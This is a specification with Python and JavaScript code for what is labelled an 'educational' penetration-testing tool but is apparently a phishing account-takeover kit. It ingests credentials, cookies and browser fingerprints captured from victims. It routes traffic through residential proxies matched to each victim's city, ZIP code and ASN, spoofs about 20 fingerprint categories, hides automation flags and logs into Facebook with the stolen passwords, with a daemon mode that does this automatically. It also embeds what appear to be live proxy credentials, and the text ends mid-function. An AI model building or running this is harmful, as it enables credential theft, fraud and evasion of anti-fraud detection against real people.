# Educational Security Research Automation System

## Project Overview

This document provides comprehensive specifications for building an **Educational Security Research Automation System** - a Python-based tool designed for authorized penetration testing and security research. The system automates browser fingerprint mimicry, geolocation-based proxy configuration, and session management for legitimate security testing purposes.

### Legal Disclaimer

**IMPORTANT**: This tool is designed exclusively for:
- Authorized penetration testing
- Red team security assessments
- Educational security research
- Legitimate security auditing

**Unauthorized use is strictly prohibited and may violate applicable laws.**

## Technical Requirements

### Required Libraries
```bash
pip install playwright>=1.40.0
pip install requests>=2.31.0
pip install watchdog>=3.0.0
playwright install chromium
```

### System Requirements
- Python 3.8 or higher
- Linux/macOS/Windows compatible
- Minimum 4GB RAM
- Stable internet connection for proxy operations

## Data Source Specification

### Educational Template Files Structure

The system integrates with educational security research templates located in `/sanitized_files/educational_template_files/`:

#### File Overview
- **`educational_custom.js`**: Client-side fingerprint collection (20 categories)
- **`educational_unified_logger.php`**: Server-side data aggregation
- **`educational_login.php`**: Credential capture and processing
- **`educational_ip_handler.php`**: IP and geolocation data collection

#### Unified Sessions Format

Data is stored in a unified JSON format (`sessions.json`) with the following structure:

```json
{
  "sessionId": "uuid-v4-string",
  "ip_address": "203.177.129.10",
  "location": {
    "city": "Caloocan City",
    "region": "Metro Manila",
    "country": "Philippines",
    "zipcode": "1409",
    "latitude": 14.6548,
    "longitude": 120.9842
  },
  "fingerprint": {
    "browser": {
      "userAgent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
      "vendor": "Google Inc.",
      "platform": "Linux armv8l",
      "language": "en-US",
      "languages": ["en-US", "en"]
    },
    "hardware": {
      "hardwareConcurrency": 8,
      "deviceMemory": 8,
      "maxTouchPoints": 5
    },
    "screen": {
      "width": 1080,
      "height": 2340,
      "colorDepth": 24,
      "pixelDepth": 24,
      "devicePixelRatio": 3
    },
    "timezone": {
      "timezone": "Asia/Manila",
      "timezoneOffset": -480
    },
    "canvas": {
      "dataUrl": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...",
      "hash": "1234567890"
    },
    "webgl": {
      "vendor": "Google Inc. (ARM)",
      "renderer": "Mali-G76 MP16"
    },
    "audio": {
      "hash": "9876543210",
      "sampleRate": 44100
    },
    "fonts": ["Roboto", "Noto Sans", "Arial", "Helvetica"],
    "plugins": [],
    "mediaDevices": [
      {"kind": "audioinput", "label": "Default - Microphone"},
      {"kind": "videoinput", "label": "Default - Camera"}
    ],
    "battery": {
      "charging": true,
      "level": 0.85
    },
    "network": {
      "effectiveType": "4g",
      "downlink": 10
    },
    "sensors": {
      "deviceMotion": true,
      "deviceOrientation": true
    },
    "features": {
      "localStorage": true,
      "sessionStorage": true,
      "webRTC": true,
      "webGL": true
    },
    "privacy": {
      "doNotTrack": null,
      "cookiesEnabled": true
    },
    "cookies": [
      {
        "name": "_fbp",
        "value": "fb.1.1234567890.1234567890",
        "domain": ".facebook.com",
        "path": "/",
        "secure": true
      }
    ],
    "storage": {
      "localStorage": {
        "user_preferences": "{\"theme\":\"dark\"}"
      },
      "sessionStorage": {
        "session_token": "abc123def456"
      }
    },
    "behavior": {
      "events": [],
      "mouseMovements": 45,
      "keystrokes": 12,
      "timeOnPage": 30000
    },
    "mediaQueries": {
      "prefersDarkScheme": true,
      "prefersReducedMotion": false
    },
    "permissions": {
      "geolocation": "granted",
      "notifications": "denied"
    },
    "performance": {
      "memory": {
        "usedJSHeapSize": 50000000
      }
    }
  },
  "credentials": [
    {
      "username": "test@example.com",
      "password": "password123",
      "timestamp": "2025-01-15 10:30:45",
      "attempt": 1
    },
    {
      "username": "test@example.com",
      "password": "wrongpass",
      "timestamp": "2025-01-15 10:31:12",
      "attempt": 2
    },
    {
      "username": "test@example.com",
      "password": "correctpass",
      "timestamp": "2025-01-15 10:32:30",
      "attempt": 3
    }
  ],
  "threat": {
    "level": "LOW",
    "reasons": [],
    "score": 0
  },
  "timestamps": {
    "first_seen": "2025-01-15 10:30:00",
    "last_updated": "2025-01-15 10:32:30",
    "last_credential": "2025-01-15 10:32:30"
  }
}
```

## DataImpulse Mobile Proxy Configuration

### Proxy Format Specification

The system uses DataImpulse mobile proxies with geolocation targeting:

```
[USERNAME]__cr.[country];state.[state];city.[city];zip.[zip];asn.[asn]:[PASSWORD]@gw.dataimpulse.com:10000
```

### Example Configuration
```
ae9bd5562646a8d33a7e__cr.ph;state.metromanila;city.caloocancity;zip.1409;asn.132199:5faeb42127544013@gw.dataimpulse.com:10000
```

### Proxy Construction Function

```python
import requests
import re

async def get_asn_from_ip(ip_address):
    """
    Lookup ASN (Autonomous System Number) from IP address
    Required for precise geolocation targeting
    """
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json", timeout=10)
        data = response.json()
        org_info = data.get('org', '')
        
        # Extract ASN number from org string (e.g., "AS132199 Converge ICT")
        asn_match = re.search(r'AS(\d+)', org_info)
        if asn_match:
            return asn_match.group(1)
        return None
    except Exception as e:
        print(f"[!] ASN lookup failed for {ip_address}: {e}")
        return None

def clean_location_string(location):
    """
    Clean location string for DataImpulse format
    Remove spaces, special characters, convert to lowercase
    """
    if not location:
        return ""
    cleaned = re.sub(r'[^a-zA-Z0-9]', '', location.lower())
    return cleaned

def convert_to_country_code(country):
    """
    Convert country name to 2-letter ISO code
    """
    country_codes = {
        'philippines': 'ph',
        'united states': 'us',
        'usa': 'us',
        'us': 'us',
        'china': 'cn',
        'japan': 'jp',
        'singapore': 'sg',
        'malaysia': 'my',
        'thailand': 'th',
        'vietnam': 'vn',
        'indonesia': 'id',
        'south korea': 'kr',
        'taiwan': 'tw',
        'hong kong': 'hk',
        'australia': 'au',
        'new zealand': 'nz',
        'canada': 'ca',
        'united kingdom': 'gb',
        'uk': 'gb',
        'germany': 'de',
        'france': 'fr',
        'spain': 'es',
        'italy': 'it',
        'netherlands': 'nl',
        'sweden': 'se',
        'norway': 'no',
        'denmark': 'dk',
        'finland': 'fi',
        'switzerland': 'ch',
        'austria': 'at',
        'belgium': 'be',
        'poland': 'pl',
        'czech republic': 'cz',
        'hungary': 'hu',
        'romania': 'ro',
        'bulgaria': 'bg',
        'croatia': 'hr',
        'slovenia': 'si',
        'slovakia': 'sk',
        'estonia': 'ee',
        'latvia': 'lv',
        'lithuania': 'lt',
        'portugal': 'pt',
        'greece': 'gr',
        'cyprus': 'cy',
        'malta': 'mt',
        'luxembourg': 'lu',
        'ireland': 'ie',
        'iceland': 'is',
        'brazil': 'br',
        'argentina': 'ar',
        'chile': 'cl',
        'colombia': 'co',
        'peru': 'pe',
        'mexico': 'mx',
        'india': 'in',
        'pakistan': 'pk',
        'bangladesh': 'bd',
        'sri lanka': 'lk',
        'nepal': 'np',
        'myanmar': 'mm',
        'cambodia': 'kh',
        'laos': 'la',
        'brunei': 'bn',
        'mongolia': 'mn',
        'kazakhstan': 'kz',
        'uzbekistan': 'uz',
        'kyrgyzstan': 'kg',
        'tajikistan': 'tj',
        'turkmenistan': 'tm',
        'afghanistan': 'af',
        'iran': 'ir',
        'iraq': 'iq',
        'syria': 'sy',
        'lebanon': 'lb',
        'jordan': 'jo',
        'israel': 'il',
        'palestine': 'ps',
        'saudi arabia': 'sa',
        'uae': 'ae',
        'qatar': 'qa',
        'kuwait': 'kw',
        'bahrain': 'bh',
        'oman': 'om',
        'yemen': 'ye',
        'egypt': 'eg',
        'libya': 'ly',
        'tunisia': 'tn',
        'algeria': 'dz',
        'morocco': 'ma',
        'sudan': 'sd',
        'ethiopia': 'et',
        'kenya': 'ke',
        'uganda': 'ug',
        'tanzania': 'tz',
        'rwanda': 'rw',
        'ghana': 'gh',
        'nigeria': 'ng',
        'south africa': 'za',
        'russia': 'ru',
        'ukraine': 'ua',
        'belarus': 'by',
        'moldova': 'md',
        'georgia': 'ge',
        'armenia': 'am',
        'azerbaijan': 'az',
        'turkey': 'tr'
    }
    
    country_lower = country.lower().strip()
    return country_codes.get(country_lower, country_lower[:2])

def build_dataimpulse_proxy(location_data, ip_address, username, password):
    """
    Build DataImpulse mobile proxy string with geolocation targeting
    
    Args:
        location_data: dict with 'country', 'region', 'city', 'zipcode'
        ip_address: Victim's IP address (for ASN lookup)
        username: DataImpulse account username
        password: DataImpulse account password
    
    Returns:
        Complete proxy string for Playwright
    """
    
    # Start with base username
    proxy_parts = [f"{username}__cr"]
    
    # Country (required) - convert to 2-letter code
    country = location_data.get('country', 'us')
    country_code = convert_to_country_code(country)
    proxy_parts.append(f".{country_code}")
    
    # State/Region (optional)
    if location_data.get('region'):
        state = clean_location_string(location_data['region'])
        if state:
            proxy_parts.append(f";state.{state}")
    
    # City (optional)
    if location_data.get('city'):
        city = clean_location_string(location_data['city'])
        if city:
            proxy_parts.append(f";city.{city}")
    
    # Zip Code (optional)
    if location_data.get('zipcode'):
        zipcode = location_data['zipcode']
        proxy_parts.append(f";zip.{zipcode}")
    
    # ASN (optional but recommended for better targeting)
    asn = get_asn_from_ip(ip_address)
    if asn:
        proxy_parts.append(f";asn.{asn}")
    
    # Build final proxy string
    username_part = ''.join(proxy_parts)
    proxy_string = f"{username_part}:{password}@gw.dataimpulse.com:10000"
    
    return proxy_string
```

## Fingerprint Injection Specifications

### Complete 20-Category Fingerprint Injection

The system must inject all 20 fingerprint categories to achieve perfect mimicry:

```python
async def inject_complete_fingerprint(context, fingerprint_data):
    """
    Inject complete 20-category fingerprint into Playwright browser context
    
    This must be called BEFORE navigating to any page
    """
    
    # Extract fingerprint categories
    browser_fp = fingerprint_data.get('browser', {})
    hardware_fp = fingerprint_data.get('hardware', {})
    screen_fp = fingerprint_data.get('screen', {})
    timezone_fp = fingerprint_data.get('timezone', {})
    canvas_fp = fingerprint_data.get('canvas', {})
    webgl_fp = fingerprint_data.get('webgl', {})
    audio_fp = fingerprint_data.get('audio', {})
    fonts_fp = fingerprint_data.get('fonts', [])
    plugins_fp = fingerprint_data.get('plugins', [])
    media_devices_fp = fingerprint_data.get('mediaDevices', [])
    battery_fp = fingerprint_data.get('battery', {})
    network_fp = fingerprint_data.get('network', {})
    sensors_fp = fingerprint_data.get('sensors', {})
    features_fp = fingerprint_data.get('features', {})
    privacy_fp = fingerprint_data.get('privacy', {})
    behavior_fp = fingerprint_data.get('behavior', {})
    media_queries_fp = fingerprint_data.get('mediaQueries', {})
    permissions_fp = fingerprint_data.get('permissions', {})
    performance_fp = fingerprint_data.get('performance', {})
    
    # Build comprehensive injection script
    injection_script = f"""
    // CATEGORY 1: Browser Identification
    Object.defineProperty(navigator, 'userAgent', {{
        get: () => '{browser_fp.get('userAgent', '')}'
    }});
    Object.defineProperty(navigator, 'vendor', {{
        get: () => '{browser_fp.get('vendor', '')}'
    }});
    Object.defineProperty(navigator, 'platform', {{
        get: () => '{browser_fp.get('platform', '')}'
    }});
    Object.defineProperty(navigator, 'language', {{
        get: () => '{browser_fp.get('language', '')}'
    }});
    Object.defineProperty(navigator, 'languages', {{
        get: () => {browser_fp.get('languages', [])}
    }});
    Object.defineProperty(navigator, 'appVersion', {{
        get: () => '{browser_fp.get('appVersion', '')}'
    }});
    Object.defineProperty(navigator, 'appName', {{
        get: () => '{browser_fp.get('appName', '')}'
    }});
    Object.defineProperty(navigator, 'appCodeName', {{
        get: () => '{browser_fp.get('appCodeName', '')}'
    }});
    Object.defineProperty(navigator, 'product', {{
        get: () => '{browser_fp.get('product', '')}'
    }});
    Object.defineProperty(navigator, 'productSub', {{
        get: () => '{browser_fp.get('productSub', '')}'
    }});
    
    // CATEGORY 2: Hardware Specs
    Object.defineProperty(navigator, 'hardwareConcurrency', {{
        get: () => {hardware_fp.get('hardwareConcurrency', 4)}
    }});
    Object.defineProperty(navigator, 'deviceMemory', {{
        get: () => {hardware_fp.get('deviceMemory', 8)}
    }});
    Object.defineProperty(navigator, 'maxTouchPoints', {{
        get: () => {hardware_fp.get('maxTouchPoints', 0)}
    }});
    
    // CATEGORY 3: Screen Properties
    Object.defineProperty(screen, 'width', {{
        get: () => {screen_fp.get('width', 1920)}
    }});
    Object.defineProperty(screen, 'height', {{
        get: () => {screen_fp.get('height', 1080)}
    }});
    Object.defineProperty(screen, 'availWidth', {{
        get: () => {screen_fp.get('availWidth', screen_fp.get('width', 1920))}
    }});
    Object.defineProperty(screen, 'availHeight', {{
        get: () => {screen_fp.get('availHeight', screen_fp.get('height', 1080))}
    }});
    Object.defineProperty(screen, 'colorDepth', {{
        get: () => {screen_fp.get('colorDepth', 24)}
    }});
    Object.defineProperty(screen, 'pixelDepth', {{
        get: () => {screen_fp.get('pixelDepth', 24)}
    }});
    Object.defineProperty(window, 'devicePixelRatio', {{
        get: () => {screen_fp.get('devicePixelRatio', 1)}
    }});
    
    // CATEGORY 4: Timezone
    Date.prototype.getTimezoneOffset = function() {{
        return {timezone_fp.get('timezoneOffset', 0)};
    }};
    Intl.DateTimeFormat.prototype.resolvedOptions = function() {{
        return {{
            ...Intl.DateTimeFormat().resolvedOptions(),
            timeZone: '{timezone_fp.get('timezone', 'UTC')}'
        }};
    }};
    
    // CATEGORY 5: Canvas Fingerprint Override
    const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL = function() {{
        if (this.width === 200 && this.height === 50) {{
            return '{canvas_fp.get('dataUrl', '')}';
        }}
        return originalToDataURL.apply(this, arguments);
    }};
    
    // CATEGORY 6: WebGL Fingerprint
    const getParameter = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function(parameter) {{
        if (parameter === 37445) {{
            return '{webgl_fp.get('vendor', 'Google Inc.')}';
        }}
        if (parameter === 37446) {{
            return '{webgl_fp.get('renderer', 'ANGLE')}';
        }}
        if (parameter === 7936) {{
            return '{webgl_fp.get('version', 'WebGL 1.0')}';
        }}
        if (parameter === 35724) {{
            return '{webgl_fp.get('shadingLanguageVersion', 'WebGL GLSL ES 1.0')}';
        }}
        return getParameter.call(this, parameter);
    }};
    
    // CATEGORY 7: Audio Context Fingerprint
    const originalCreateAnalyser = AudioContext.prototype.createAnalyser;
    AudioContext.prototype.createAnalyser = function() {{
        const analyser = originalCreateAnalyser.call(this);
        const originalGetFloatFrequencyData = analyser.getFloatFrequencyData;
        analyser.getFloatFrequencyData = function(array) {{
            originalGetFloatFrequencyData.call(this, array);
            // Modify frequency data to match fingerprint
            for (let i = 0; i < array.length; i++) {{
                array[i] = (array[i] + {audio_fp.get('hash', '0')}) % 1.0;
            }}
        }};
        return analyser;
    }};
    
    // CATEGORY 8: Fonts Detection Bypass
    const originalMeasureText = CanvasRenderingContext2D.prototype.measureText;
    CanvasRenderingContext2D.prototype.measureText = function(text) {{
        const result = originalMeasureText.call(this, text);
        // Modify width based on detected fonts
        const fontModifier = {len(fonts_fp) if fonts_fp else 0} * 0.1;
        result.width += fontModifier;
        return result;
    }};
    
    // CATEGORY 9: Plugins Override
    Object.defineProperty(navigator, 'plugins', {{
        get: () => {{
            const plugins = [];
            {f'''
            for (let i = 0; i < {len(plugins_fp)}; i++) {{
                plugins.push({{
                    name: 'Plugin ' + i,
                    description: 'Educational Plugin',
                    filename: 'plugin' + i + '.dll'
                }});
            }}
            ''' if plugins_fp else ''}
            return plugins;
        }}
    }});
    
    // CATEGORY 10: Media Devices Override
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {{
        const originalEnumerateDevices = navigator.mediaDevices.enumerateDevices;
        navigator.mediaDevices.enumerateDevices = function() {{
            return Promise.resolve([
                {f'''
                {', '.join([f'{{kind: "{device.get("kind", "audioinput")}", label: "{device.get("label", "Default Device")}"}}' for device in media_devices_fp])}
                ''' if media_devices_fp else ''}
            ]);
        }};
    }}
    
    // CATEGORY 11: Battery API Override
    if (navigator.getBattery) {{
        const originalGetBattery = navigator.getBattery;
        navigator.getBattery = function() {{
            return Promise.resolve({{
                charging: {str(battery_fp.get('charging', True)).lower()},
                chargingTime: {battery_fp.get('chargingTime', 0)},
                dischargingTime: {battery_fp.get('dischargingTime', 0)},
                level: {battery_fp.get('level', 1.0)}
            }});
        }};
    }}
    
    // CATEGORY 12: Network Information Override
    if (navigator.connection) {{
        Object.defineProperty(navigator.connection, 'effectiveType', {{
            get: () => '{network_fp.get('effectiveType', '4g')}'
        }});
        Object.defineProperty(navigator.connection, 'downlink', {{
            get: () => {network_fp.get('downlink', 10)}
        }});
        Object.defineProperty(navigator.connection, 'rtt', {{
            get: () => {network_fp.get('rtt', 50)}
        }});
    }}
    
    // CATEGORY 13: Sensors Override
    Object.defineProperty(window, 'DeviceMotionEvent', {{
        get: () => {sensors_fp.get('deviceMotion', True)}
    }});
    Object.defineProperty(window, 'DeviceOrientationEvent', {{
        get: () => {sensors_fp.get('deviceOrientation', True)}
    }});
    
    // CATEGORY 14: Feature Detection Override
    Object.defineProperty(window, 'localStorage', {{
        get: () => {{
            if ({str(features_fp.get('localStorage', True)).lower()}) {{
                return window.localStorage;
            }}
            return null;
        }}
    }});
    Object.defineProperty(window, 'sessionStorage', {{
        get: () => {{
            if ({str(features_fp.get('sessionStorage', True)).lower()}) {{
                return window.sessionStorage;
            }}
            return null;
        }}
    }});
    
    // CATEGORY 15: Privacy Settings Override
    Object.defineProperty(navigator, 'doNotTrack', {{
        get: () => '{privacy_fp.get('doNotTrack', '1')}'
    }});
    Object.defineProperty(navigator, 'cookieEnabled', {{
        get: () => {str(privacy_fp.get('cookiesEnabled', True)).lower()}
    }});
    
    // CATEGORY 16: Media Queries Override
    const originalMatchMedia = window.matchMedia;
    window.matchMedia = function(query) {{
        if (query === '(prefers-color-scheme: dark)') {{
            return {{ matches: {str(media_queries_fp.get('prefersDarkScheme', False)).lower()} }};
        }}
        if (query === '(prefers-reduced-motion: reduce)') {{
            return {{ matches: {str(media_queries_fp.get('prefersReducedMotion', False)).lower()} }};
        }}
        return originalMatchMedia.call(this, query);
    }};
    
    // CATEGORY 17: Permissions API Override
    if (navigator.permissions && navigator.permissions.query) {{
        const originalQuery = navigator.permissions.query;
        navigator.permissions.query = function(permission) {{
            const permissionName = permission.name;
            const state = '{permissions_fp.get(permissionName, 'granted')}';
            return Promise.resolve({{ state: state }});
        }};
    }}
    
    // CATEGORY 18: Performance API Override
    if (performance.memory) {{
        Object.defineProperty(performance.memory, 'usedJSHeapSize', {{
            get: () => {performance_fp.get('memory', {}).get('usedJSHeapSize', 50000000)}
        }});
        Object.defineProperty(performance.memory, 'totalJSHeapSize', {{
            get: () => {performance_fp.get('memory', {}).get('totalJSHeapSize', 100000000)}
        }});
        Object.defineProperty(performance.memory, 'jsHeapSizeLimit', {{
            get: () => {performance_fp.get('memory', {}).get('jsHeapSizeLimit', 200000000)}
        }});
    }}
    
    // CATEGORY 19: Anti-Detection Measures
    Object.defineProperty(navigator, 'webdriver', {{
        get: () => undefined
    }});
    Object.defineProperty(navigator, 'plugins', {{
        get: () => {{
            const plugins = [];
            {f'''
            for (let i = 0; i < {len(plugins_fp)}; i++) {{
                plugins.push({{
                    name: 'Plugin ' + i,
                    description: 'Educational Plugin',
                    filename: 'plugin' + i + '.dll'
                }});
            }}
            ''' if plugins_fp else ''}
            return plugins;
        }}
    }});
    
    // CATEGORY 20: Additional Anti-Detection
    delete window.chrome;
    delete window.navigator.webdriver;
    delete window.navigator.__proto__.webdriver;
    
    // Override automation indicators
    Object.defineProperty(window, 'chrome', {{
        get: () => undefined
    }});
    
    // Override automation detection
    const originalToString = Function.prototype.toString;
    Function.prototype.toString = function() {{
        if (this === navigator.webdriver) {{
            return 'function webdriver() {{ [native code] }}';
        }}
        return originalToString.call(this);
    }};
    """
    
    await context.add_init_script(injection_script)
    print(f"[+] Injected 20-category fingerprint successfully")
```

## Browser Launch Configuration

### Complete Browser Launch Function

```python
async def launch_browser_with_fingerprint_and_proxy(session_data, config):
    """
    Complete browser launch with fingerprint injection and proxy configuration
    """
    from playwright.async_api import async_playwright
    
    # Extract session data
    session_id = session_data.get('sessionId')
    fingerprint = session_data.get('fingerprint', {})
    credentials = session_data.get('credentials', [])
    location = session_data.get('location', {})
    ip_address = session_data.get('ip_address')
    
    print(f"\n[+] Processing educational session: {session_id}")
    print(f"[+] Target location: {location.get('city')}, {location.get('region')}, {location.get('country')}")
    
    # Build DataImpulse proxy string
    proxy_string = build_dataimpulse_proxy(
        location_data=location,
        ip_address=ip_address,
        username=config['DATAIMPULSE_USERNAME'],
        password=config['DATAIMPULSE_PASSWORD']
    )
    print(f"[+] Proxy configured: {proxy_string[:50]}...")
    
    # Parse proxy for Playwright
    username_part = proxy_string.split(':')[0]
    password_part = proxy_string.split(':')[1].split('@')[0]
    
    proxy_config = {
        'server': 'http://gw.dataimpulse.com:10000',
        'username': username_part,
        'password': password_part
    }
    
    # Launch browser with proxy and fingerprint
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=config.get('HEADLESS_MODE', False),
            args=[
                '--disable-blink-features=AutomationControlled',
                '--disable-dev-shm-usage',
                '--no-sandbox',
                '--disable-web-security',
                '--disable-features=VizDisplayCompositor'
            ]
        )
        
        # Create context with fingerprint injection
        context = await browser.new_context(
            proxy=proxy_config,
            viewport={
                'width': fingerprint.get('screen', {}).get('width', 1920),
                'height': fingerprint.get('screen', {}).get('height', 1080)
            },
            user_agent=fingerprint.get('browser', {}).get('userAgent', ''),
            locale=fingerprint.get('browser', {}).get('language', 'en-US'),
            timezone_id=fingerprint.get('timezone', {}).get('timezone', 'UTC'),
            device_scale_factor=fingerprint.get('screen', {}).get('devicePixelRatio', 1),
            color_scheme='dark' if fingerprint.get('mediaQueries', {}).get('prefersDarkScheme', False) else 'light'
        )
        
        # Inject complete fingerprint before any page loads
        await inject_complete_fingerprint(context, fingerprint)
        
        # Inject cookies and storage
        await inject_cookies_and_storage(context, fingerprint)
        
        page = await context.new_page()
        
        # Verify proxy is working
        if config.get('VERIFY_PROXY', True):
            print("[+] Verifying proxy connection...")
            await page.goto('https://ipinfo.io/json')
            ip_data = await page.content()
            print(f"[+] Current IP: {ip_data}")
        
        # Perform automatic login if enabled
        if config.get('AUTO_LOGIN', True):
            print("[+] Attempting automatic login...")
            await perform_automatic_login(page, credentials)
        
        print("[✓] Educational browser ready for research")
        print("[*] Press Ctrl+C to close browser")
        
        # Keep browser open for manual interaction
        try:
            await asyncio.sleep(999999)
        except KeyboardInterrupt:
            await browser.close()
            print("[+] Browser closed")
```

### Cookie and Storage Injection

```python
async def inject_cookies_and_storage(context, page, fingerprint_data):
    """
    Inject cookies and localStorage/sessionStorage from captured data
    """
    
    # Inject cookies
    cookies_data = fingerprint_data.get('cookies', [])
    if cookies_data:
        await context.add_cookies(cookies_data)
        print(f"[+] Injected {len(cookies_data)} cookies")
    
    # Inject localStorage
    local_storage = fingerprint_data.get('storage', {}).get('localStorage', {})
    if local_storage:
        await page.add_init_script(f"""
            const localStorageData = {json.dumps(local_storage)};
            Object.keys(localStorageData).forEach(key => {{
                localStorage.setItem(key, localStorageData[key]);
            }});
        """)
        print(f"[+] Injected {len(local_storage)} localStorage items")
    
    # Inject sessionStorage
    session_storage = fingerprint_data.get('storage', {}).get('sessionStorage', {})
    if session_storage:
        await page.add_init_script(f"""
            const sessionStorageData = {json.dumps(session_storage)};
            Object.keys(sessionStorageData).forEach(key => {{
                sessionStorage.setItem(key, sessionStorageData[key]);
            }});
        """)
        print(f"[+] Injected {len(session_storage)} sessionStorage items")
```

## Automatic Login Implementation

### Facebook Login Automation

```python
async def perform_automatic_login(page, credentials):
    """
    Automatically fill and submit login form with captured credentials
    
    Args:
        page: Playwright page object
        credentials: List of credential dicts (use attempt 3)
    """
    
    # Get credentials from attempt 3
    login_creds = None
    for cred in credentials:
        if cred.get('attempt') == 3:
            login_creds = cred
            break
    
    if not login_creds:
        login_creds = credentials[-1]  # Fallback to last attempt
    
    username = login_creds.get('username')
    password = login_creds.get('password')
    
    if not username or not password:
        print("[!] No valid credentials found for automatic login")
        return
    
    print(f"[+] Attempting login for: {username}")
    
    try:
        # Navigate to Facebook login page
        await page.goto('https://www.facebook.com/login', wait_until='networkidle')
        await page.wait_for_timeout(2000)  # Wait for page to load
        
        # Fill email field
        email_selector = 'input[name="email"], input[type="email"], input[placeholder*="email"], input[placeholder*="Email"]'
        await page.wait_for_selector(email_selector, timeout=10000)
        await page.fill(email_selector, username)
        await page.wait_for_timeout(500)  # Human-like delay
        
        # Fill password field
        password_selector = 'input[name="pass"], input[type="password"], input[placeholder*="password"], input[placeholder*="Password"]'
        await page.wait_for_selector(password_selector, timeout=10000)
        await page.fill(password_selector, password)
        await page.wait_for_timeout(500)
        
        # Click login button
        login_button_selector = 'button[name="login"], button[type="submit"], input[type="submit"], button:has-text("Log In"), button:has-text("Login")'
        await page.wait_for_selector(login_button_selector, timeout=10000)
        await page.click(login_button_selector)
        
        # Wait for navigation
        await page.wait_for_load_state('networkidle', timeout=30000)
        
        # Check if login was successful
        current_url = page.url
        if 'facebook.com' in current_url and 'login' not in current_url:
            print(f"[✓] Login successful! Redirected to: {current_url}")
            
            # Take screenshot for verification
            await page.screenshot(path=f'login_success_{int(time.time())}.png')
            
        else:
            print(f"[!] Login may have failed. Current URL: {current_url}")
            
            # Check for error messages
            error_selectors = [
                '[data-testid="error_message"]',
                '.error_message',
                '[role="alert"]',
                '.alert',
                '.error'
            ]
            
            for selector in error_selectors:
                try:
                    error_element = await page.query_selector(selector)
                    if error_element:
                        error_text = await error_element.text_content()
                        print(f"[!] Error message: {error_text}")
                        break
                except:
                    continue
            
    except Exception as e:
        print(f"[!] Login automation failed: {e}")
        
        # Take screenshot for debugging
        await page.screenshot(path=f'login_error_{int(time.time())}.png')
```

## Dual Mode Operation

### Automatic Daemon Mode

```python
async def automatic_mode(config):
    """
    Continuously monitor sessions directory for new data
    Automatically launch browser when new credentials detected
    """
    print("[*] Starting automatic daemon mode...")
    print(f"[*] Monitoring: {config['SESSIONS_FILE']}")
    print(f"[*] Check interval: {config['CHECK_INTERVAL']} seconds")
    
    processed_sessions = set()
    
    while True:
        try:
            sessions_file = os.path.expanduser(config['SESSIONS_FILE'])
            
            if os.path.exists(sessions_file):
                with open(sessions_file, 'r') as f:
                    sessions = json.load(f)
                
                for session in sessions:
                    session_id = session.get('sessionId')
                    credentials = session.get('credentials', [])
                    
                    # Check if attempt 3 exists and not processed
                    has_attempt_3 = any(c.get('attempt') == 3 for c in credentials)
                    
                    if has_attempt_3 and session_id not in processed_sessions:
                        print(f"\n[+] New educational session detected: {session_id}")
                        print(f"[+] Launching browser with fingerprint mimicry...")
                        
                        await launch_browser_with_fingerprint_and_proxy(session, config)
                        processed_sessions.add(session_id)
                        
                        # Wait before processing next session
                        await asyncio.sleep(5)
            
            await asyncio.sleep(config['CHECK_INTERVAL'])
            
        except KeyboardInterrupt:
            print("\n[+] Automatic mode stopped by user")
            break
        except Exception as e:
            print(f"[!] Error in automatic mode: {e}")
            await asyncio.sleep(config['CHECK_INTERVAL'])
```

### Manual Selection Mode

```python
async def manual_mode(config):
    """
    Allow user to select which session to open
    """
    print("[*] Manual mode: Select a session to open")
    
    sessions_file = os.path.expanduser(config['SESSIONS_FILE'])
    
    if not os.path.exists(sessions_file):
        print("[-] No sessions file found")
        return
    
    try:
        with open(sessions_file, 'r') as f:
            sessions = json.load(f)
    except Exception as e:
        print(f"[-] Error reading sessions file: {e}")
        return
    
    if not sessions:
        print("[-] No sessions available")
        return
    
    print("\n[*] Available educational sessions:")
    for i, session in enumerate(sessions):
        credentials = session.get('credentials', [])
        last_cred = credentials[-1] if credentials else {}
        username = last_cred.get('username', 'N/A')
        attempt = last_cred.get('attempt', 0)
        location = session.get('location', {})
        city = location.get('city', 'N/A')
        country = location.get('country', 'N/A')
        
        print(f"  {i+1}. {session.get('sessionId', 'N/A')[:8]}... - {username} (Attempt {attempt}) - {city}, {country}")
    
    try:
        choice = input("\n[?] Select session number (or 'q' to quit): ").strip()
        
        if choice.lower() == 'q':
            print("[+] Exiting manual mode")
            return
        
        choice_num = int(choice) - 1
        
        if 0 <= choice_num < len(sessions):
            selected_session = sessions[choice_num]
            print(f"[+] Selected session: {selected_session.get('sessionId')}")
            
            await launch_browser_with_fingerprint_and_proxy(selected_session, config)
        else:
            print("[-] Invalid selection")
            
    except ValueError:
        print("[-] Invalid input")
    except KeyboardInterrupt:
        print("\n[+] Manual mode cancelled")
```

## Complete Code Template

### Main Script Structure

```python
#!/usr/bin/env python3
"""
Educational Security Research Automation System
Author: Security Research Team
Purpose: Automated browser fingerprint mimicry for authorized penetration testing
"""

import asyncio
import argparse
import json
import os
import time
import requests
import re
from datetime import datetime
from pathlib import Path

# Import Playwright
from playwright.async_api import async_playwright

# Configuration
CONFIG = {
    'DATAIMPULSE_USERNAME': 'ae9bd5562646a8d33a7e',  # Replace with your username
    'DATAIMPULSE_PASSWORD': '5faeb42127544013',      # Replace with your password
    'SESSIONS_FILE': '~/.site/sessions.json',
    'BROWSER_DATA_DIR': '~/.browser_sessions',
    'HEADLESS_MODE': False,
    'VERIFY_PROXY': True,
    'AUTO_LOGIN': True,
    'CHECK_INTERVAL': 2,
    'TRIGGER_ON_ATTEMPT': 3
}

# Helper Functions (ASN lookup, proxy builder, etc.)
# [Include all helper functions from previous sections]

# Fingerprint Injection Function
# [Include complete fingerprint injection function]

# Cookie and Storage Injection Function
# [Include cookie/storage injection function]

# Browser Launch Function
# [Include complete browser launch function]

# Automatic Login Function
# [Include automatic login function]

# Daemon Mode Implementation
# [Include automatic daemon mode]

# Manual Mode Implementation
# [Include manual selection mode]

async def main():
    """
    Main entry point for the educational security research automation system
    """
    parser = argparse.ArgumentParser(
        description='Educational Security Research Automation System',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python educational_automation.py --mode auto
  python educational_automation.py --mode manual
  python educational_automation.py --mode auto --headless
        """
    )
    
